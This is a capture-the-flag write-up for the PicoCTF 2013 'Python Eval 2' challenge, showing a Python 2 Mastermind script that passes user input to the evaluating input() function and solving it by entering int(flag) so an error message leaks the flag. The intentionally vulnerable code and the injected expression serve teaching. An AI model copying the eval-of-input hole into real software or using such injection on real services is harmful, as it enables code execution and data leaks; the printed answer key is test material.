# PicoCTF 2013: Python Eval 2

**Category:** Script Exploitation
**Points:** 90
**Description:**

> It is recommended that you complete Python Eval 1 before trying [Python Eval 2](https://2013.picoctf.com/problems/pyeval/stage2.html).

## Write-up
>This challenge is very similiar to Python Eval 1 and also involves exploiting a Python script's input function.
> We're given the following script (running at python.picoctf.com 6362) and are expected to get the program to print out the flag variable.

```
# task2.py
from random import randint

def printpegs(code):
  print " --------------------- "
  print " |",
  for c in code:
    print c, "|",
  print ""
  print " --------------------- "

print "Master Mind Game"

flag = "xxxxxxxxxx"

mm_code = (randint(0,9), randint(0,9), randint(0,9), randint(0,9), randint(0,9))
print "I've set my code. Guess it!"

print "Rules: You should input your guesses as 5 digits separated by commas."
print "       I will respond by marking the correct digits with a 2, marking"
print "       digits in the wrong place with a 1, and marking wrong digits 0."

while True:
  guess = input('guess> ')
  if len(guess) != 5:
    print "You must guess a 5-digit code!"
    continue

  printpegs(guess)

  right = map(lambda x,y: (x == y) + (x in mm_code), guess, mm_code)
  printpegs(right)

  if guess == mm_code:
    print "You got it right!"
    exit(0)
```
> This script defines a 'guess' variable with the vulnerable input function. It then calculates wheter the guess is correct. 

> We can solve this challenge by causing the program to throw an exception.

>Inputting *int(flag)* gives us the answer.
```
guess> int(flag)
Traceback (most recent call last):
  File "/home/py2/task2.py", line 25, in <module>
    guess = input('guess> ')
  File "<string>", line 1, in <module>
ValueError: invalid literal for int() with base 10: 'i_are_a_pyeval_mastermind'
```



**Answer: i_are_a_pyeval_mastermind** 

## Other write-ups and resources

* none yet
